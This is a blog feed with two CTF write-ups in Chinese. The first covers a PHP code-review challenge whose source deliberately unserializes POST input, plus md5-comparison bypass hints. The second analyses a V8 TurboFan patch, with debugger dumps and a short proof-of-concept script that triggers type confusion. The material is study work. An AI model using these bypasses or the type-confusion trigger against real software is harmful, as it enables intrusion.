<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-31T13:43:45+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ln3’s blog</title><subtitle>binary noob
</subtitle><entry><title type="html">buusec_2019_code_review_1</title><link href="http://localhost:4000/web/2025/05/31/buusec_2019_code_review_1.html" rel="alternate" type="text/html" title="buusec_2019_code_review_1" /><published>2025-05-31T15:20:22+08:00</published><updated>2025-05-31T15:20:22+08:00</updated><id>http://localhost:4000/web/2025/05/31/buusec_2019_code_review_1</id><content type="html" xml:base="http://localhost:4000/web/2025/05/31/buusec_2019_code_review_1.html"><![CDATA[<h1 id="buusec_2019_code_review_1">buusec_2019_code_review_1</h1>

<p>[toc]</p>

<p>项目链接<a href="https://github.com/glzjin/buusec_2019_code_review_1/tree/master">buusec_2019_code_review_1</a></p>

<p>源码</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>

<span class="kd">class</span> <span class="nc">BUU</span> <span class="p">{</span>
   <span class="k">public</span> <span class="nv">$correct</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
   <span class="k">public</span> <span class="nv">$input</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>

   <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
       <span class="k">try</span> <span class="p">{</span>
           <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">correct</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">uniqid</span><span class="p">());</span>
           <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">correct</span> <span class="o">===</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
               <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/flag"</span><span class="p">);</span>
           <span class="p">}</span>
       <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
       <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pleaseget'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'1'</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pleasepost'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'2'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'md51'</span><span class="p">])</span> <span class="o">==</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'md52'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'md51'</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'md52'</span><span class="p">])</span> <span class="p">{</span>
            <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'obj'</span><span class="p">]);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="难点">难点</h2>

<ol>
  <li>同时满足GET与POST</li>
  <li>通过md5相等校验</li>
  <li>反序列化后的base64比较</li>
</ol>

<h2 id="解法">解法</h2>

<ol>
  <li>使用hackerbar的enable Post data功能
    <ul>
      <li>本质上是在post请求的路径里添加查询参数</li>
    </ul>
  </li>
  <li>三种解法
    <ol>
      <li>传入数组, md5不能处理数组, 返回null</li>
      <li>传入硬碰撞md5值</li>
      <li>传入做md5 0e数字解析碰撞</li>
    </ol>
  </li>
  <li>构造反序列化<strong>php变量引用</strong>
    <ul>
      <li>对变量的别名, 类型相同, 本质上是指向同一块内存</li>
    </ul>
  </li>
</ol>]]></content><author><name></name></author><category term="web" /><summary type="html"><![CDATA[buusec_2019_code_review_1]]></summary></entry><entry><title type="html">2019 强网杯 accessible分析</title><link href="http://localhost:4000/v8/2023/08/28/accessible.html" rel="alternate" type="text/html" title="2019 强网杯 accessible分析" /><published>2023-08-28T07:20:22+08:00</published><updated>2023-08-28T07:20:22+08:00</updated><id>http://localhost:4000/v8/2023/08/28/accessible</id><content type="html" xml:base="http://localhost:4000/v8/2023/08/28/accessible.html"><![CDATA[<h2 id="分析patch">分析patch</h2>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/compiler/access-info.cc b/src/compiler/access-info.cc
index 0744138..1df06df 100644
</span><span class="gd">--- a/src/compiler/access-info.cc
</span><span class="gi">+++ b/src/compiler/access-info.cc
</span><span class="p">@@ -370,9 +370,11 @@</span> PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
       // The field type was cleared by the GC, so we don't know anything
       // about the contents now.
     }
<span class="gi">+#if 0
</span>     unrecorded_dependencies.push_back(
         dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref,
                                                                   descriptor));
<span class="gi">+#endif
</span>     if (descriptors_field_type-&gt;IsClass()) {
       // Remember the field map, and try to infer a useful type.
       Handle&lt;Map&gt; map(descriptors_field_type-&gt;AsClass(), isolate());
<span class="p">@@ -384,15 +386,17 @@</span> PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
   }
   // TODO(turbofan): We may want to do this only depending on the use
   // of the access info.
<span class="gi">+#if 0
</span>   unrecorded_dependencies.push_back(
       dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));
<span class="gi">+#endif
</span> 
   PropertyConstness constness;
   if (details.IsReadOnly() &amp;&amp; !details.IsConfigurable()) {
     constness = PropertyConstness::kConst;
   } else {
     map_ref.SerializeOwnDescriptor(descriptor);
<span class="gd">-    constness = dependencies()-&gt;DependOnFieldConstness(map_ref, descriptor);
</span><span class="gi">+    constness = PropertyConstness::kConst;
</span>   }
   Handle&lt;Map&gt; field_owner_map(map-&gt;FindFieldOwner(isolate(), descriptor),
                               isolate());
</code></pre></div></div>

<p>patch点位于ComputeDataFieldAccessInfo中</p>

<p>将两个unrecord_dependencies.push的操作注释掉了，同时将PropertyConstness类型的constness将原来的DependOnFieldConstness结果改为了固定的kConst</p>

<p>找到该函数的源码</p>

<p><img src="/imgs/image-20230602161311034.png" alt="image-20230602161311034" /></p>

<p>该函数返回了一个DataField或者DataConst，但是仅有一个kind不同</p>

<p><img src="/imgs/image-20230602161617639.png" alt="image-20230602161617639" /></p>

<p>同时也注意到第一个push出现在details_representation为HeapObject的case</p>

<p><img src="/imgs/image-20230602161358730.png" alt="image-20230602161358730" /></p>

<p>向上查看details_representation指代的对象是谁</p>

<p><img src="/imgs/image-20230602161733603.png" alt="image-20230602161733603" /></p>

<p>从details获取details_representation，details为map的DescriptorArray中的某一项属性记录的detail</p>

<p>receiver_map为被查找对象的map，向上寻找map变量的来源</p>

<p><img src="/imgs/image-20230603200121221.png" alt="image-20230603200121221" /></p>

<p>经过一些调试会发现此时的receiver_map与map均为被访问对象的map</p>

<p>此循环在原型链上搜索属性，以map为循环变量，传入的map为实际的拥有属性的对象的map，所以如果仅在变量上定义属性时这里一般会相等</p>

<p>分析一下被去掉的代码的作用</p>

<p><img src="/imgs/image-20230603201225324.png" alt="image-20230603201225324" /></p>

<p><img src="/imgs/image-20230603201236889.png" alt="image-20230603201236889" /></p>

<p>函数产生了一个CompilationDependency一个抽象基类指针</p>

<p>CompilationDependency派生出很多Dependency</p>

<p><img src="/imgs/image-20230603201449118.png" alt="image-20230603201449118" /></p>

<p><img src="/imgs/image-20230603201523083.png" alt="image-20230603201523083" /></p>

<p>都实现了Install函数，对code安装依赖</p>

<p>根据对jit编译的了解，可以知道这些dependency是用来标明jit代码的依赖，当依赖不满足时及时地将代码deoptimize回bytecode解释器执行</p>

<p><img src="/imgs/image-20230603201853383.png" alt="image-20230603201853383" /></p>

<p>在建立依赖的过程中，首先从拥有属性的map中调用FindFieldOwner</p>

<p>需要理解一下这个fieldowner具体是指谁的map</p>

<p><img src="/imgs/image-20230606144603524.png" alt="image-20230606144603524" /></p>

<p>实现中有两种实现，在jsheapbroker的模式为disable时调用map的FindFieldOwner方法</p>

<p>或者是从mapref类所引用的map的instance_descriptors中找到对应索引的PropertyDescriptor</p>

<p><img src="/imgs/image-20230606144808193.png" alt="image-20230606144808193" /></p>

<p>里面只有一个字段看起来是与map相关的，即field_owner</p>

<p>我们写一个例子来看一下</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">q</span><span class="dl">'</span><span class="p">:</span><span class="mf">1.1</span><span class="p">}};</span>
<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">o</span><span class="p">);</span>
<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">p</span><span class="p">);</span>
<span class="o">%</span><span class="nx">SystemBreak</span><span class="p">();</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DebugPrint: 0x273fe544b249: [JS_OBJECT_TYPE]
 - map: 0x11232970a6b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x1b89284c20e1 &lt;Object map = 0x112329700209&gt;
 - elements: 0x1cf27a1c0c01 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x1cf27a1c0c01 &lt;FixedArray[0]&gt; {
    #p: 0x273fe544b269 &lt;Object map = 0x11232970a669&gt; (const data field 0)
 }
0x11232970a6b9: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 32
 - inobject properties: 1
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x11232970a619 &lt;Map(HOLEY_ELEMENTS)&gt;
 - prototype_validity cell: 0x2a8e03680659 &lt;Cell value= 1&gt;
 - instance descriptors (own) #1: 0x273fe544b2b9 &lt;DescriptorArray[1]&gt;
 - layout descriptor: (nil)
 - prototype: 0x1b89284c20e1 &lt;Object map = 0x112329700209&gt;
 - constructor: 0x1b89284c2119 &lt;JSFunction Object (sfi = 0x2a8e036898e9)&gt;
 - dependent code: 0x1cf27a1c02a1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
 - construction counter: 0

DebugPrint: 0x273fe544b269: [JS_OBJECT_TYPE]
 - map: 0x11232970a669 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x1b89284c20e1 &lt;Object map = 0x112329700209&gt;
 - elements: 0x1cf27a1c0c01 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x1cf27a1c0c01 &lt;FixedArray[0]&gt; {
    #q: &lt;unboxed double&gt; 1.1 (const data field 0)
 }
0x11232970a669: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 32
 - inobject properties: 1
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x11232970a619 &lt;Map(HOLEY_ELEMENTS)&gt;
 - prototype_validity cell: 0x2a8e03680659 &lt;Cell value= 1&gt;
 - instance descriptors (own) #1: 0x273fe544b289 &lt;DescriptorArray[1]&gt;
 - layout descriptor: 0x100000000
 - prototype: 0x1b89284c20e1 &lt;Object map = 0x112329700209&gt;
 - constructor: 0x1b89284c2119 &lt;JSFunction Object (sfi = 0x2a8e036898e9)&gt;
 - dependent code: 0x1cf27a1c02a1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
 - construction counter: 0

pwndbg&gt; job 0x273fe544b2b9
0x273fe544b2b9: [DescriptorArray]
 - map: 0x1cf27a1c0251 &lt;Map&gt;
 - enum_cache: empty
 - nof slack descriptors: 0
 - nof descriptors: 1
 - raw marked descriptors: mc epoch 0, marked 0
  [0]: #p (const data field 0:h, p: 0, attrs: [WEC]) @ Class(0x11232970a669)
pwndbg&gt; tel 0x273fe544b2b9-1
00:0000│  0x273fe544b2b8 —▸ 0x1cf27a1c0251 ◂— 0x1cf27a1c01
01:0008│  0x273fe544b2c0 ◂— 0x10001
02:0010│  0x273fe544b2c8 —▸ 0x1cf27a1c2389 ◂— 0x100001cf27a1c23
03:0018│  0x273fe544b2d0 —▸ 0x1b89284df859 ◂— 0x4200001cf27a1c04
04:0020│  0x273fe544b2d8 ◂— 0xc400000000
05:0028│  0x273fe544b2e0 —▸ 0x11232970a66b ◂— 0x4030400001cf27a # field map
06:0030│  0x273fe544b2e8 ◂— 0xdeadbeedbeadbeef
07:0038│  0x273fe544b2f0 ◂— 0xdeadbeedbeadbeef
pwndbg&gt; job 0x1b89284df859
#p
</code></pre></div></div>

<p>可以观察到o对象的instace_descriptor的DescriptorArray中拥有p的map</p>

<p>看似此时可以得到FindFieldOwner返回的应该是字段的map的结论，但是调试过后发现并非如此</p>

<p><img src="/imgs/image-20230606153859300.png" alt="image-20230606153859300" /></p>

<p>分析map的FindFieldOwner函数，理论上该函数应当与mapref中的函数返回相同结果</p>

<p>这里进行了一个循环，遍历对象的back pointer链来寻找一个拥有descriptor索引的instance_descriptor，并将具有这个instace_descriptor的对象作为map返回</p>

<p>但是我们这里的back pointer是不存在这个属性的</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; job 0xe2008c0a6b9
0xe2008c0a6b9: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 32
 - inobject properties: 1
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x0e2008c0a619 &lt;Map(HOLEY_ELEMENTS)&gt;                 # back pointer链
 - prototype_validity cell: 0x0d2e9b9c0659 &lt;Cell value= 1&gt;
 - instance descriptors (own) #1: 0x31de10fcb5c1 &lt;DescriptorArray[1]&gt; # 长度 == 1, 需要找到一个有0索引的对象
 - layout descriptor: (nil)
 - prototype: 0x24c1d11820e1 &lt;Object map = 0xe2008c00209&gt;
 - constructor: 0x24c1d1182119 &lt;JSFunction Object (sfi = 0xd2e9b9c98e9)&gt;
 - dependent code: 0x02f667c402a1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
 - construction counter: 0
pwndbg&gt; job 0x0e2008c0a619
0xe2008c0a619: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 32
 - inobject properties: 1
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 1
 - enum length: invalid
 - back pointer: 0x02f667c404b1 &lt;undefined&gt;							   # 链尾
 - prototype_validity cell: 0x0d2e9b9c0659 &lt;Cell value= 1&gt;
 - instance descriptors (own) #0: 0x02f667c40239 &lt;DescriptorArray[0]&gt;  # 长度 == 0
 - layout descriptor: (nil)
 - transitions #2: 0x24c1d119fe11 &lt;TransitionArray[6]&gt;Transition array #2:
     #a: (transition to (const data field, attrs: [WEC]) @ Class(0xe2008c0a669)) -&gt; 0x0e2008c0a6b9 &lt;Map(HOLEY_ELEMENTS)&gt;
     #m: (transition to (const data field, attrs: [WEC]) @ Any) -&gt; 0x0e2008c0a669 &lt;Map(HOLEY_ELEMENTS)&gt;

 - prototype: 0x24c1d11820e1 &lt;Object map = 0xe2008c00209&gt;
 - constructor: 0x24c1d1182119 &lt;JSFunction Object (sfi = 0xd2e9b9c98e9)&gt;
 - dependent code: 0x02f667c402a1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
 - construction counter: 0
</code></pre></div></div>

<p>所以这个函数最后返回的依然是本对象的map，而不是先前推测的字段属性的map，</p>

<p>而关于之前DescriptorArray中的map的来源，从chromium code search里DescriptorArray的注释中提到结构中的value可能会有一个map的weak reference，但是并没有解释其作用与具体指向</p>

<p><img src="/imgs/image-20230606160112227.png" alt="image-20230606160112227" /></p>

<p>我们可以以此推测jsheapbroker实际上会对js对象的一些数据做cache，将对象的字段的owner记录在PropertyDescriptor结构中，这样就省去了每次遍历back pointer的开销</p>

<p>查找一下引用会发现在SerializeOwnDescriptor中，存在对PropertyDescriptor的创建</p>

<p><img src="/imgs/image-20230606160605434.png" alt="image-20230606160605434" /></p>

<p>简要分析可以发现该函数透过jsheapbroker更新了map的instance_descriptor中对应属性的PropertyDescriptor信息，验证了我们刚才的推测</p>

<p><img src="/imgs/image-20230603201853383.png" alt="image-20230603201853383" /></p>

<p>回到函数，可以确认此时owner为拥有此属性的对象的map</p>

<p><img src="/imgs/image-20230606163637241.png" alt="image-20230606163637241" /></p>

<p><img src="/imgs/image-20230606163651195.png" alt="image-20230606163651195" /></p>

<p>InstallDependency的逻辑较为简单，更新将code插入map的dependent code字段数组中</p>

<p>我们看到PropertyAccessBuilder的BuildCheckMaps函数的逻辑</p>

<p><img src="/imgs/image-20230606162757037.png" alt="image-20230606162757037" /></p>

<p>可以看到这里有两种方式，第一种判断了receiver的map是否stable，如果stable，且根据access_info得到的receiver_maps中确实有这个map，则添加一个StableMap的依赖</p>

<p>否则创建一个checkmaps的node，在运行时鉴别对象的map</p>

<p>这里也说明了v8中有两种deoptimize的机制，一种是通过依赖来标记代码，在运行时若发生了依赖变化，则deoptimize相应代码，另一种则是使用checkmaps的代码来运行时检查map类型是否匹配</p>

<p>map的dependent code就是为了deoptimize而设，当map变为unstable时，即可根据该字段来遍历所有依赖当前stable map的optimized code</p>

<p><img src="/imgs/image-20230606164253443.png" alt="image-20230606164253443" /></p>

<p>所有依赖在Commit函数中被Install，时机为编译流水线的结尾</p>

<p><img src="/imgs/image-20230606185336157.png" alt="image-20230606185336157" /></p>

<p>此时审视我们最开始得到的patch</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gi">+#if 0
</span>     unrecorded_dependencies.push_back(
         dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref,
                                                                   descriptor));
<span class="gi">+#endif
</span>     if (descriptors_field_type-&gt;IsClass()) {
       // Remember the field map, and try to infer a useful type.
       Handle&lt;Map&gt; map(descriptors_field_type-&gt;AsClass(), isolate());
<span class="p">@@ -384,15 +386,17 @@</span> PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
   }
   // TODO(turbofan): We may want to do this only depending on the use
   // of the access info.
<span class="gi">+#if 0
</span>   unrecorded_dependencies.push_back(
       dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));
<span class="gi">+#endif
</span></code></pre></div></div>

<p>FieldType根据一些代码可以知道实际就是指代字段的map</p>

<p>这里将两个依赖注释了，导致当字段属性的representation为HeapObject时，程序没有正确地记录FieldOwner对于field的representation与type的依赖，而记录是通过对map install dependent code来完成的，因此在函数编译后，修改FieldOwner类型理论上也不会</p>

<p>所以理论上可以修改FieldOwner的类型来造成类型混淆</p>

<p>我们还需要确定一下函数的触发路径</p>

<p>在chromium code search中查找一下patch函数引用</p>

<p><img src="/imgs/image-20230602155652981.png" alt="image-20230602155652981" /></p>

<p>只出现在ComputePropertyAccessInfo中，继续往下找</p>

<p><img src="/imgs/image-20230602155733376.png" alt="image-20230602155733376" /></p>

<p>有两个引用</p>

<p>分别查看一下</p>

<p><img src="/imgs/image-20230602155811751.png" alt="image-20230602155811751" /></p>

<p><img src="/imgs/image-20230602155915506.png" alt="image-20230602155915506" /></p>

<p>GetPropertyAccessInfo用的更加频繁一些，同时注意到有一个ReduceNamedAccess，这表明turbofan在优化具名属性访问如o.xxx时会引用到这里的结果</p>

<h2 id="剖析poc">剖析poc</h2>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">o</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="na">x</span><span class="p">:</span> <span class="p">{</span><span class="na">y</span><span class="p">:</span> <span class="mf">1.1</span><span class="p">}}</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>

<span class="nx">obj</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="p">{</span><span class="na">z</span><span class="p">:</span> <span class="p">{}};</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">opt</span><span class="p">(</span><span class="nx">obj</span><span class="p">))</span>
</code></pre></div></div>

<p>观察生成的字节码</p>

<p><img src="/imgs/image-20230606194647224.png" alt="image-20230606194647224" /></p>

<p>opt函数产生了两次属性访问</p>

<p>通过以下命令进行调试</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb <span class="nt">--args</span> ./d8 <span class="nt">--allow-natives-syntax</span> <span class="nt">--trace-opt-verbose</span> <span class="nt">--trace-deopt</span> ./poc.js
</code></pre></div></div>

<p>通过turbolizer观察编译过程中的节点变化</p>

<p><img src="/imgs/image-20230606194908037.png" alt="image-20230606194908037" /></p>

<p><img src="/imgs/image-20230606194304500.png" alt="image-20230606194304500" /></p>

<p>发现产生了两个checkmaps，与我们预期的通过depend code进行deoptimize有些不符</p>

<p>且在loadelimination阶段将第二个checkmaps去除</p>

<p>分析checkmaps的出处</p>

<p><img src="/imgs/image-20230602160843157.png" alt="image-20230602160843157" /></p>

<p><img src="/imgs/image-20230606194447428.png" alt="image-20230606194447428" /></p>

<p>当receiver转换为string或number失败时调用BuildCheckMaps</p>

<p><img src="/imgs/image-20230606194513633.png" alt="image-20230606194513633" /></p>

<p>调试发现m.HasValue()对于两次调用均不成立</p>

<p><img src="/imgs/image-20230606195204624.png" alt="image-20230606195204624" /></p>

<p><img src="/imgs/image-20230606195247896.png" alt="image-20230606195247896" /></p>

<p>发现此函数需要node的opcode为HeapConstant，难以满足，所以落入checkmaps的path</p>

<p>通过调试也发现dependent code集中在o.x而非o</p>

<p><img src="/imgs/image-20230606203223136.png" alt="image-20230606203223136" /></p>

<p>分析loadelimination中发生的事</p>

<p><img src="/imgs/image-20230606203403032.png" alt="image-20230606203403032" /></p>

<p>调用ReduceCheckMaps，第一次调用时，node state中没有记录map，通过该checkmaps后更新check的map范围到node state中</p>

<p>再经过ReduceLoadField获取到field的map，更新到node state中，故第二次时map会落入范围中，成功reduce</p>

<p>poc中最后使用了重赋值来修改obj.x的类型，这个操作并不会改变obj的map</p>

<p>同时也注意到obj的初始化方式较为特别</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="na">x</span><span class="p">:</span> <span class="p">{</span><span class="na">y</span><span class="p">:</span> <span class="mf">1.1</span><span class="p">}}</span>
</code></pre></div></div>

<p>v8中初始化对象时，若采取以下形式</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="na">b</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="na">c</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="na">d</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span><span class="na">e</span><span class="p">:</span><span class="mi">4</span><span class="p">,</span><span class="na">f</span><span class="p">:</span><span class="mi">5</span><span class="p">}</span>
</code></pre></div></div>

<p>则v8会尽量优化成a对象中带有5个inline property，直接依附在对象结构上，而不在Properties数组中</p>

<p>同时一个字典默认初始化时，一般会带有4个默认的slot来存放property</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{}</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">x0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// inline</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">x1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// inline</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">x2</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// inline</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">x3</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="c1">// inline</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">x4</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span> <span class="c1">// in properties</span>
</code></pre></div></div>

<p>具体可以参考v8 blogs中的<a href="https://v8.dev/blog/fast-properties">这篇文章</a></p>

<p>同时触发混淆的成员名不能与原来相同</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="na">x</span><span class="p">:</span> <span class="p">{</span><span class="na">y</span><span class="p">:</span> <span class="mf">1.1</span><span class="p">}}</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>

<span class="nx">obj</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="p">{</span><span class="na">z</span><span class="p">:</span> <span class="p">{}};</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">opt</span><span class="p">(</span><span class="nx">obj</span><span class="p">))</span>
</code></pre></div></div>

<p>即此处的z不能为y</p>

<p>因为这样创造出来的{y:{}}实际是{y:1.1}的泛化</p>

<p>由于v8的field representation generalization机制，当一个field被修改成一个更加泛用的类型的值时，如smi修改为Tagged指针，为了表示这样的转变，v8根据版本不同会有两种处理方式，较早的版本会建立一个新map，将field representation修改为Tagged，将原来的map舍弃，较新的版本考虑到性能问题，会就地进行可兼容的representation转换，但是这两种方法最终都会invalidate code dependency，导致deoptimize</p>

<p>这个逻辑实现在Map::GeneralizeField中</p>

<p><img src="/imgs/image-20230613214250869.png" alt="image-20230613214250869" /></p>]]></content><author><name></name></author><category term="v8" /><summary type="html"><![CDATA[分析patch diff --git a/src/compiler/access-info.cc b/src/compiler/access-info.cc index 0744138..1df06df 100644 --- a/src/compiler/access-info.cc +++ b/src/compiler/access-info.cc @@ -370,9 +370,11 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo( // The field type was cleared by the GC, so we don't know anything // about the contents now. } +#if 0 unrecorded_dependencies.push_back( dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref, descriptor)); +#endif if (descriptors_field_type-&gt;IsClass()) { // Remember the field map, and try to infer a useful type. Handle&lt;Map&gt; map(descriptors_field_type-&gt;AsClass(), isolate()); @@ -384,15 +386,17 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo( } // TODO(turbofan): We may want to do this only depending on the use // of the access info. +#if 0 unrecorded_dependencies.push_back( dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor)); +#endif PropertyConstness constness; if (details.IsReadOnly() &amp;&amp; !details.IsConfigurable()) { constness = PropertyConstness::kConst; } else { map_ref.SerializeOwnDescriptor(descriptor); - constness = dependencies()-&gt;DependOnFieldConstness(map_ref, descriptor); + constness = PropertyConstness::kConst; } Handle&lt;Map&gt; field_owner_map(map-&gt;FindFieldOwner(isolate(), descriptor), isolate()); patch点位于ComputeDataFieldAccessInfo中 将两个unrecord_dependencies.push的操作注释掉了，同时将PropertyConstness类型的constness将原来的DependOnFieldConstness结果改为了固定的kConst 找到该函数的源码 该函数返回了一个DataField或者DataConst，但是仅有一个kind不同 同时也注意到第一个push出现在details_representation为HeapObject的case 向上查看details_representation指代的对象是谁 从details获取details_representation，details为map的DescriptorArray中的某一项属性记录的detail receiver_map为被查找对象的map，向上寻找map变量的来源 经过一些调试会发现此时的receiver_map与map均为被访问对象的map 此循环在原型链上搜索属性，以map为循环变量，传入的map为实际的拥有属性的对象的map，所以如果仅在变量上定义属性时这里一般会相等 分析一下被去掉的代码的作用 函数产生了一个CompilationDependency一个抽象基类指针 CompilationDependency派生出很多Dependency 都实现了Install函数，对code安装依赖 根据对jit编译的了解，可以知道这些dependency是用来标明jit代码的依赖，当依赖不满足时及时地将代码deoptimize回bytecode解释器执行 在建立依赖的过程中，首先从拥有属性的map中调用FindFieldOwner 需要理解一下这个fieldowner具体是指谁的map 实现中有两种实现，在jsheapbroker的模式为disable时调用map的FindFieldOwner方法 或者是从mapref类所引用的map的instance_descriptors中找到对应索引的PropertyDescriptor 